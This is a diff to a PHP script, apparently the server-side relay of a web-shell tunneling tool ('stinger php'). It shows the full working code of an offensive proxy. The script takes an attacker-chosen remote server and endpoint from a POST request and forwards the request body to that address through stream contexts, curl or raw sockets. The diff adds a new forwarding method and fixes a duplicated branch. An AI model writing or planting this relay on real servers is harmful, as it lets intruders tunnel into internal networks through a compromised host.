@@ -1,12 +1,14 @@
 <?php
-ini_set("display_errors", 1);
+ini_set("display_errors", "On");
 if ($_SERVER['REQUEST_METHOD'] === 'GET') {
     print("curl_init\n");
     var_dump(function_exists("curl_init"));
-    print("fsockopen\n");
+    print("\nfsockopen\n");
     var_dump(function_exists("fsockopen"));
-    print("file_get_contents\n");
+    print("\nfile_get_contents\n");
     var_dump(function_exists("file_get_contents"));
+    print("\nstream_context_create\n");
+    var_dump(function_exists("stream_context_create"));
     exit("stinger php!");
 }
 function my_socket_post($url, $data)
@@ -48,22 +50,41 @@ HEADER;
     $result = explode("\r\n\r\n", $result, 2);
     print_r(isset ($result [1]) ? $result [1] : '');
 }
+function post($url, $data)
+{
+
+  //$postdata = http_build_query($data);
+  $opts = array('http' =>
+           array(
+             'method' => 'POST',
+             'header' => 'Content-type: application/x-www-form-urlencoded',
+             'content' => $data
+           )
+  );
+  $context = stream_context_create($opts);
+  $result = file_get_contents($url, false, $context);
+  print_r($result);
+}
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $post_arg = file_get_contents("php://input");
     $RemoteServer = $_POST['Remoteserver'];
     $Endpoint = $_POST['Endpoint'];
-    if (function_exists('curl_init')) {
+    if (function_exists('stream_context_create')) {
+        $url = $RemoteServer . $Endpoint;
+        post($url, $post_arg);
+    }
+    elseif (function_exists("curl_init")) {
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $post_arg);
         curl_setopt($ch, CURLOPT_URL, $RemoteServer . $Endpoint);
         curl_exec($ch);
         curl_close($ch);
-    } elseif (function_exists("curl_init")) {
+    } elseif (function_exists("fsockopen")) {
         $url = $RemoteServer . $Endpoint;
         my_socket_post($url, $post_arg);
-    } else {
+    }else {
         exit("stinger php error!");
     }
 }
